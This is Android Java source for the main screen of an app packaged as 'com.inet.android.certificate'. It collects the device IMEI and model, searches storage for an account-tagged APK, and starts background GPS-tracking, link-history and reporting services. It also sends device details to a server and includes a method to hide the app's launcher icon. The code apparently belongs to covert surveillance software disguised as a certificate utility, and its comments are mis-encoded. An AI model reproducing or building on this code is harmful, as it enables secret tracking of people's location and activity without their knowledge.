package com.inet.android.bs;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.List;
import java.util.concurrent.TimeUnit;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.widget.Button;
import android.widget.EditText;

import com.inet.android.certificate.R;
import com.inet.android.history.LinkService;
import com.inet.android.location.GPSTracker;
import com.inet.android.request.DataRequest;
import com.inet.android.request.StartRequest;
import com.inet.android.utils.Logging;

public class MainActivity extends Activity {
	Button install;
	Button exit;
	GPSTracker gps;
	LinkService link;
	AlertDialog.Builder ad;
	Context context;
	final String SAVED_TIME = "saved_time";
	Editor e;
	SharedPreferences sp;
	byte[] data;
	String incFile;
	private String aboutDev;
	private static String LOG_TAG = "mainActivity";
	String fileID = "id.txt";
	String ID = null;
	List<String> result;
	File root;
	File[] fileArray;
	private String sIMEI;
	private String sID;
//	private String account;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
		// setContentView(R.layout.activity_main);

		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
		
		context = getApplicationContext();

		sp = PreferenceManager
				.getDefaultSharedPreferences(getApplicationContext());
		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

		String imeistring = manager.getDeviceId();
		String model = android.os.Build.MODEL;
		String androidVersion = android.os.Build.VERSION.RELEASE;

		aboutDev = " Model: " + model + " Version android: " + androidVersion;
		sIMEI = imeistring;
		e = sp.edit();
		e.putString("BUILD", "A0003 2013-10-03 20:00:00");
		e.putString("imei", "0001");
		e.putString("ABOUT", aboutDev);
		e.putString("model", model);
		e.commit();

		boolean hasVisited = sp.getBoolean("hasVisited", false);

		if (!hasVisited) {
			// �������� �� ������ ������
			e = sp.edit();
			e.putBoolean("hasVisited", true);
			e.putString("ABOUT", aboutDev);
			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // ����� ��� ������� ������� ��������
			e.putString("period", "1"); // ������������� ������ ������ 10 �����
			e.putString("code", "-1");
			e.commit();
			
//			hideIcon();
		}
		
		getID(); // ����������� ����� ����� � ������ ������
		if (sp.getString("ID", "ID").equals("ID")) {

			Logging.doLog(LOG_TAG, "File not found. Show dialog.", "File not found. Show dialog.");
			
			viewIDDialog();
		} else
			finish();
	}
	
	@Override
	public void onConfigurationChanged(Configuration newConfig) {  
	        super.onConfigurationChanged(newConfig);  
	}
	private boolean viewIDDialog() {
		AlertDialog.Builder alert = new AlertDialog.Builder(this);

		alert.setTitle("���� account number");
		alert.setMessage("������� account number. ��� ����� �� ������!");

		final EditText input = new EditText(this);
		alert.setView(input);

		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int whichButton) {
				String value = input.getText().toString();

				Logging.doLog(LOG_TAG, "Text: " + value, "Text: " + value);
				
				sp = PreferenceManager
						.getDefaultSharedPreferences(getApplicationContext());
				Editor e = sp.edit();
				e.putString("account", value);
				e.commit();
				start(); // ������ ��������
//				sendDiagPost();
//				sendStartRequest();
				finish();
			}
		});

		alert.setNegativeButton("Cancel",
				new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int whichButton) {
						// Canceled.
						finish();
					}
				});

		alert.show();
		return true;
	}

	public void sendDiagPost() {
		String diag = "<packet><id>" + sp.getString("ID", "ID") + "</id><time>"
				+ logTime() + "</time><type>1</type><ttl>"
				+ sp.getString("BUILD", "A0003 2013-10-03 20:00:00")
				+ "</ttl><cls>" + sp.getString("IMEI", "0000")
				+ "</cls><url>"
				+ Long.toString(System.currentTimeMillis())
				+ sp.getString("ABOUT", "about") + "</url></packet>";

		Logging.doLog(LOG_TAG, "MainAct diagRequest: before req", "MainAct diagRequest: before req");

//		RequestMakerImpl req = new RequestMakerImpl(context);
//		req.sendDataRequest(diag);
		DataRequest dr = new DataRequest(context);
		dr.sendRequest(diag);
		
		Logging.doLog(LOG_TAG, "MainAct diagRequest: post req", "MainAct diagRequest: post req");
	}

	public void getID() {
		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");
		
		File file[] = Environment.getExternalStorageDirectory().listFiles();
		recursiveFileFind(file);
	}

	public boolean recursiveFileFind(File[] file1) {
		int i = 0;
		String filePath = "";
		if (file1 != null) {
			while (i != file1.length) {
				filePath = file1[i].getAbsolutePath();
				sID = file1[i].getName();
				if (file1[i].isDirectory()) {
					File[] file = file1[i].listFiles();
					if (recursiveFileFind(file) == true) {
						return true;
					}
				}

				if (sID.indexOf("ts.apk") != -1) {
					ID = sID.substring(0, sID.indexOf("t"));
					e = sp.edit();
					e.putString("account", ID);
					e.commit();
//					Log.d("ID", sp.getString("ID", "ID"));
					if (!sp.getString("account", "account").equals("account")) {
//						sendStartRequest();
//						sendDiagPost();
						start(); // ������ ��������
						return true;
					}
					break;
				}
				i++;
			}

		}
		return false;
	}

	private void sendStartRequest() {
//		RequestMaker service = new RequestMakerImpl(context);
//		String str = "\"";
//		service.sendStartRequest(str);
		JSONObject jsonObject = new JSONObject();
		try {
			jsonObject.put("account", sp.getString("account", "0000"));
			jsonObject.put("imei", sp.getString("imei", "0000"));
			jsonObject.put("model", "iphone");
		} catch (JSONException e) {
			e.printStackTrace();
		}
		
		String str = jsonObject.toString();
		StartRequest sr = new StartRequest(context);
		sr.sendRequest(str);
		
		Logging.doLog(LOG_TAG, "start services", "start Request4");

		startService(new Intent(MainActivity.this, Request4.class));
	}

	public void start() {
		Logging.doLog(LOG_TAG, "start services", "start services");

		startService(new Intent(MainActivity.this, Request4.class));

		try {
			TimeUnit.MILLISECONDS.sleep(1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		startService(new Intent(MainActivity.this, GPSTracker.class));
		startService(new Intent(MainActivity.this, LinkService.class));
		
		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
	}

	public void hideIcon() {
		ComponentName componentToDisable = new ComponentName(
				"com.inet.android.certificate",
				"com.inet.android.bs.MainActivity");

		getPackageManager().setComponentEnabledSetting(componentToDisable,
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@SuppressLint("SimpleDateFormat")
	private static String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}
}